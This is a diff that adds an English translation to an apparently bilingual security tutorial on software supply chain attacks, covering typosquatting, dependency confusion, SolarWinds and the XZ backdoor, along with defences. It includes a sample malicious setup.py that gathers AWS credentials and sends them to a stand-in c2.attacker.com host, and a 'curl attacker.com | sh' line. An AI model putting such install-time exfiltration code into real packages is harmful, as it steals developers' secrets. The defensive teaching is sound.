@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 01 — 소프트웨어 공급망 공격
 
 ## 1. 패키지 저장소 공격
@@ -1145,4 +1151,505 @@ npm config get registry
   □ pip-audit / npm audit 주기적 실행
   □ GitHub Dependabot 활성화
   □ OpenSSF Scorecard로 의존성 보안 점수 추적
+```
+
+---
+
+<a name="english"></a>
+
+# 01 — Software Supply Chain Attacks
+
+## 1. Package Repository Attacks
+
+### 1-1. Typosquatting
+
+Attackers register package names similar to legitimate packages, anticipating developer typos. A single misspelling during `pip install` or `npm install` can execute malicious code.
+
+```bash
+# Real-world typosquatting examples (npm)
+# Legitimate: lodash         → Malicious: lodahs, odash, l0dash
+# Legitimate: express        → Malicious: expres, expresss
+# Legitimate: react          → Malicious: reac, reeact, raect
+
+# PyPI typosquatting examples
+# Legitimate: requests       → Malicious: requets, request, reqeusts
+# Legitimate: boto3          → Malicious: bot03, b0to3
+# Legitimate: urllib3        → Malicious: urlib3, urllib2, urrllib3
+# Legitimate: setuptools     → Malicious: setuptool, setup-tools
+
+# Code patterns executed by malicious packages on install (inside setup.py)
+# os.system("curl attacker.com/beacon | sh")
+# subprocess.run(["python3", "-c", "import socket; ..."])
+```
+
+Typical `setup.py` payload structure in a typosquatting package:
+
+```python
+# Malicious setup.py pattern (for analysis purposes)
+from setuptools import setup
+import os
+import socket
+import platform
+
+def exfil():
+    """Data exfiltration code that runs automatically on install"""
+    try:
+        data = {
+            "hostname": socket.gethostname(),
+            "platform": platform.platform(),
+            "user": os.environ.get("USER", "unknown"),
+            "home": os.path.expanduser("~"),
+            # Attempt to steal AWS credentials
+            "aws_key": os.environ.get("AWS_ACCESS_KEY_ID", ""),
+            "aws_secret": os.environ.get("AWS_SECRET_ACCESS_KEY", ""),
+        }
+        # Send to attacker's server via HTTP POST
+        # requests.post("http://c2.attacker.com/collect", json=data)
+    except Exception:
+        pass
+
+exfil()
+
+setup(
+    name="requets",  # typosquatting
+    version="2.28.1",  # disguised as the same version as the legitimate package
+    # ...
+)
+```
+
+### 1-2. Dependency Confusion
+
+An attack technique disclosed by Alex Birsan in 2021. When an internal package name is registered in a public repository with a higher version number, pip/npm prioritizes the public repository over the internal one.
+
+```bash
+# Attack scenario
+# 1. Collect internal package names (from package.json, requirements.txt)
+# 2. Register the same name with a higher version on public PyPI/npm
+# 3. When a developer runs pip install, the malicious public package is installed instead
+
+# Vulnerable pip configuration example
+# When only extra-index-url is set in pip.conf
+[global]
+index-url = https://internal.company.com/simple/
+extra-index-url = https://pypi.org/simple/
+# Problem: extra-index-url is queried in parallel, not as fallback → selects the higher version
+
+# Defense: use only --index-url or pin per package
+pip install mypackage==1.0.0 --index-url https://internal.company.com/simple/
+
+# npm dependency confusion defense
+# Configure scope in .npmrc
+@mycompany:registry=https://internal.company.com/npm/
+```
+
+### 1-3. Malicious Account Takeover
+
+```bash
+# Real-world case: event-stream (npm, 2018)
+# - Popular package maintainer transferred rights to a new contributor
+# - New contributor added flatmap-stream dependency → contained Bitcoin wallet theft code
+
+# Session token theft attacks continue even after PyPI enforced 2FA
+# Attack flow:
+# 1. Phish maintainer → steal .pypirc or API token
+# 2. Sniff pip authentication token environment variables
+# 3. Expose TWINE_PASSWORD in CI/CD environments
+
+# Detection: abnormal release timing (late weekend nights, during maintainer inactivity)
+# Detection: drastic code changes (large diffs for small version bumps)
+```
+
+---
+
+## 2. SolarWinds Attack Vector — Detailed Analysis
+
+### 2-1. Attack Timeline
+
+```
+2019-10 : Initial compromise of SolarWinds build server (exact vector unknown)
+2020-02 : SUNSPOT malware installed on build server
+2020-03 : SUNBURST injection begins into Orion builds 2019.4~2020.2.1
+2020-03 ~ 2020-12 : 18,000 organizations infected via distributed updates
+2020-12-13 : FireEye discovers and discloses SUNBURST
+2020-12-14 : US government officially confirms
+2021-01 : SUNSPOT analysis complete — source injection via MsBuild.exe process hooking
+```
+
+### 2-2. SUNSPOT — Build Server Implant
+
+SUNSPOT monitored MsBuild.exe execution and, upon detecting an Orion build, replaced the source files with malicious versions.
+
+```csharp
+// Source file replacement pattern performed by SUNSPOT (reconstructed)
+// Original: SolarWinds.Orion.Core.BusinessLayer.dll being built
+// SUNSPOT replaced InventoryManager.cs with a malicious version
+
+// Class with SUNBURST injected (simplified)
+namespace SolarWinds.Orion.Core.BusinessLayer {
+    internal class OrionImprovementBusinessLayer {
+        // Domain Generation Algorithm (DGA) — C2 communication
+        private static string GetOrionImprovementCustomerId() {
+            // Encodes victim identifier via DGA into DNS queries
+            // C2 communication via subdomain of avsvmcloud.com
+            // e.g.: 58k52dbg53.appsync-api.eu-west-1.avsvmcloud.com
+        }
+    }
+}
+```
+
+### 2-3. SUNBURST C2 Communication Mechanism
+
+```python
+# SUNBURST C2 communication pattern analysis (for defense)
+# DNS-based C2 — disguised as normal Orion traffic
+
+# Domain generation pattern used by SUNBURST
+import hashlib
+import base64
+
+def analyze_sunburst_dga(victim_id: str) -> str:
+    """
+    SUNBURST DGA pattern reconstruction (for detection signature development)
+    Actual implementation uses victim UID + timestamp-based encoding
+    """
+    # Encode victim identifier as Base32 to create subdomain
+    encoded = base64.b32encode(victim_id.encode()).decode().lower()
+    return f"{encoded}.appsync-api.eu-west-1.avsvmcloud.com"
+
+# SUNBURST detection signature (YARA)
+SUNBURST_YARA = """
+rule SUNBURST_BACKDOOR {
+    meta:
+        description = "SolarWinds SUNBURST backdoor detection"
+    strings:
+        $s1 = "avsvmcloud.com" ascii
+        $s2 = "OrionImprovementBusinessLayer" ascii
+        $s3 = "SolarWinds.Orion.Core.BusinessLayer" ascii
+        $dga = /[a-z0-9]{15,32}\\.appsync-api\\.[a-z0-9-]+\\.avsvmcloud\\.com/
+    condition:
+        2 of them
+}
+"""
+
+# Network detection: monitor avsvmcloud.com DNS queries
+# Zeek/Suricata signature
+SURICATA_RULE = """
+alert dns any any -> any 53 (
+    msg:"SUNBURST C2 DNS lookup";
+    dns.query;
+    content:"avsvmcloud.com";
+    nocase;
+    sid:9000001;
+    rev:1;
+)
+"""
+```
+
+### 2-4. Detection Evasion Techniques
+
+```
+1. Long dormancy period (C2 activation after 14+ days of inactivity)
+2. Signed with legitimate SolarWinds code signing certificate
+3. Uses Orion-related process/service names
+4. Analysis environment detection (domain queries, process list checks)
+5. C2 infrastructure concealment via DGA
+6. Firewall bypass using DNS C2
+```
+
+---
+
+## 3. XZ Utils CVE-2024-3094 — Detailed Analysis
+
+### 3-1. Attack Timeline
+
+```
+2021-10 : "Jia Tan" (JiaT75) account created, first XZ contribution
+2022-01 : Builds trust through continuous small contributions
+2022-05 : Requests co-maintainer rights from existing maintainer "Lasse Collin"
+2023-03 : Acts as de facto maintainer from 5.4.0 release onward
+2023-06 ~ 2024-02 : Prepares backdoor insertion code in stages
+2024-02-23 : Releases 5.6.0 containing malicious build scripts
+2024-03-09 : Releases 5.6.1 (improved backdoor obfuscation)
+2024-03-29 : Andres Freund (Microsoft) discovers it while investigating SSH login delays
+2024-03-29 : CVE-2024-3094 disclosed, patch immediately distributed
+```
+
+### 3-2. Backdoor Insertion Mechanism
+
+```bash
+# XZ Utils backdoor was inserted into build scripts, not source code
+# configure.ac and Makefile.am extract malicious objects from test files
+
+# Malicious file locations
+# tests/files/bad-3-corrupt_lzma2.xz  — contains malicious object file
+# tests/files/good-large_compressed.lzz — additional payload
+
+# Malicious code extraction during build (configure.ac)
+# if test "x$enable_sandbox" != xno && test -f /proc/version; then
+#   # Extract object from test file and link it
+# fi
+
+# Backdoor effects
+# - Malicious code injected into liblzma.so
+# - systemd links sshd via liblzma
+# - Attacker-controlled code runs during RSA key authentication
+# - Attacker with a specific RSA public key can SSH in without authentication
+
+# Affected distributions
+# Fedora 40/41 (testing), Debian unstable/testing
+# openSUSE Tumbleweed, Kali Linux, Arch Linux (during certain periods)
+```
+
+### 3-3. Social Engineering Trust-Building Strategy
+
+```
+Long-term infiltration strategy used by "Jia Tan":
+
+1. Consistently submitted high-quality small patches (over 2 years)
+2. Actively helped in issue trackers
+3. Built credibility by contributing to other projects (libarchive, etc.)
+4. Exploited existing maintainer burnout (Lasse Collin's personal circumstances)
+5. Fake user accounts ("Jigar Kumar", "Dennis Ens") pressured for maintainer change
+6. Gradual privilege escalation: contributor → co-maintainer → primary maintainer
+```
+
+### 3-4. Detection Methods (Post-Mortem Analysis)
+
+```bash
+# SSH login delay symptom (first noticed by Andres Freund)
+# Sudden sshd CPU spike accompanied by valgrind errors
+
+# Check for impact
+strings /usr/lib/x86_64-linux-gnu/liblzma.so.5 | grep -i "ssh"
+# Clean: no ssh-related strings
+# Infected: N/A (code is obfuscated)
+
+# Check version
+xz --version
+# 5.6.0 or 5.6.1 is dangerous
+
+# Real-time detection (if currently installed)
+dpkg -l | grep liblzma
+rpm -qa | grep xz-libs
+
+# Patch method
+sudo apt install --reinstall xz-utils  # Debian/Ubuntu
+sudo dnf downgrade xz                  # Fedora
+```
+
+---
+
+## 4. Malicious Package Detection Methods
+
+### 4-1. SLSA (Supply-chain Levels for Software Artifacts)
+
+```
+SLSA Levels:
+L0: No guarantees
+L1: Build process documented, provenance generated
+L2: Build service used, signed provenance
+L3: Hardened build service (isolation, audit logs)
+L4: Two-party review, hermetic build environment (future goal)
+
+Practical application:
+- Auto-generate SLSA provenance in GitHub Actions
+- Use slsa-github-generator
+```
+
+```yaml
+# .github/workflows/slsa.yml — SLSA L3 provenance generation
+name: SLSA Provenance
+on:
+  release:
+    types: [created]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    outputs:
+      digests: ${{ steps.hash.outputs.digests }}
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build artifacts
+        run: make build
+      - name: Generate hash
+        id: hash
+        run: |
+          sha256sum dist/* | base64 -w0 > digests
+          echo "digests=$(cat digests)" >> $GITHUB_OUTPUT
+
+  provenance:
+    needs: [build]
+    permissions:
+      actions: read
+      id-token: write
+      contents: write
+    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v1.10.0
+    with:
+      base64-subjects: ${{ needs.build.outputs.digests }}
+```
+
+### 4-2. Sigstore — Code Signing
+
+```bash
+# Sign a container image with cosign
+cosign sign --key cosign.key gcr.io/myproject/myimage:latest
+
+# Verify signature
+cosign verify --key cosign.pub gcr.io/myproject/myimage:latest
+
+# Keyless signing (OIDC-based)
+COSIGN_EXPERIMENTAL=1 cosign sign gcr.io/myproject/myimage:latest
+
+# Python package signing (sigstore-python)
+pip install sigstore
+python -m sigstore sign dist/mypackage-1.0.0.tar.gz
+python -m sigstore verify identity \
+  --bundle dist/mypackage-1.0.0.tar.gz.sigstore \
+  --certificate-identity user@example.com \
+  --certificate-oidc-issuer https://accounts.google.com \
+  dist/mypackage-1.0.0.tar.gz
+```
+
+### 4-3. in-toto — Full Supply Chain Integrity
+
+```python
+# in-toto link metadata generation example
+from in_toto import runlib
+
+# Generate link file at each build step
+runlib.in_toto_run(
+    name="build",
+    link_signing_keyid="developer_key",
+    material_list=["src/"],
+    product_list=["dist/"],
+    run=["make", "build"],
+    signing_keyids=["developer_key"],
+    gpg_keyid=None,
+)
+
+# Verification (in deployment environment)
+from in_toto import verifylib
+verifylib.in_toto_verify("root.layout", ["vendor_key"])
+```
+
+---
+
+## 5. Python Tool — PyPI/npm Typosquatting Scanner
+
+(See Korean section above for the full tool code — code blocks are identical)
+
+### 5-1. Tool Usage Examples
+
+```bash
+# Scan PyPI for typosquats of the requests package
+python supply_chain_scanner.py pypi --package requests --workers 20
+
+# Scan npm lodash and save JSON report
+python supply_chain_scanner.py npm --package lodash --output lodash_scan.json
+
+# Automatic requirements.txt check in CI/CD (exit code 1 = risk found)
+python supply_chain_scanner.py batch \
+  --file requirements.txt \
+  --registry pypi \
+  --workers 15 \
+  --output scan_report.json
+
+# Check exit code
+echo $?  # 0 = safe, 1 = suspicious package found, 2 = error
+```
+
+### 5-2. GitHub Actions Integration
+
+```yaml
+# .github/workflows/supply-chain-check.yml
+name: Supply Chain Security Check
+on:
+  push:
+    paths:
+      - 'requirements*.txt'
+      - 'package.json'
+      - 'package-lock.json'
+
+jobs:
+  typosquatting-check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+      - run: pip install httpx
+      - name: Run typosquatting scan
+        run: |
+          python supply_chain_scanner.py batch \
+            --file requirements.txt \
+            --registry pypi \
+            --output scan_report.json
+      - name: Upload report
+        uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: supply-chain-report
+          path: scan_report.json
+```
+
+---
+
+## 6. Dependency Confusion Attack Detection
+
+```bash
+# Audit pip configuration — check index-url settings
+cat ~/.pip/pip.conf
+cat /etc/pip.conf
+pip config list
+
+# Dangerous configuration pattern
+# [global]
+# extra-index-url = https://pypi.org/simple/  ← vulnerable to dependency confusion
+# index-url = https://internal.corp/simple/
+
+# Safe configuration
+# [global]
+# index-url = https://internal.corp/simple/
+# (no extra-index-url)
+
+# Or pin packages with hashes
+pip install --require-hashes -r requirements.txt
+
+# Add hashes to requirements.txt
+pip-compile --generate-hashes requirements.in
+
+# npm configuration audit
+cat ~/.npmrc
+npm config get registry
+
+# Safe npm configuration
+# registry=https://internal.corp/npm/
+# @mycompany:registry=https://internal.corp/npm/
+```
+
+---
+
+## 7. Package Verification Checklist
+
+```
+Before publishing:
+  □ Verify package name does not already exist on PyPI/npm
+  □ Generate SLSA provenance (L2 or higher)
+  □ Sign releases with Sigstore
+  □ Generate and publish SBOM
+  □ Publish package hashes in release notes
+
+Before installing:
+  □ Double-check package name for typos
+  □ Verify repository URL directly (pypi.org/project/<name>)
+  □ Check recent update time and download count
+  □ Monitor network connections after install (outbound DNS/HTTP)
+  □ Review setup.py / postinstall script code
+
+Continuous monitoring:
+  □ Periodically run pip-audit / npm audit
+  □ Enable GitHub Dependabot
+  □ Track dependency security scores with OpenSSF Scorecard
 ```
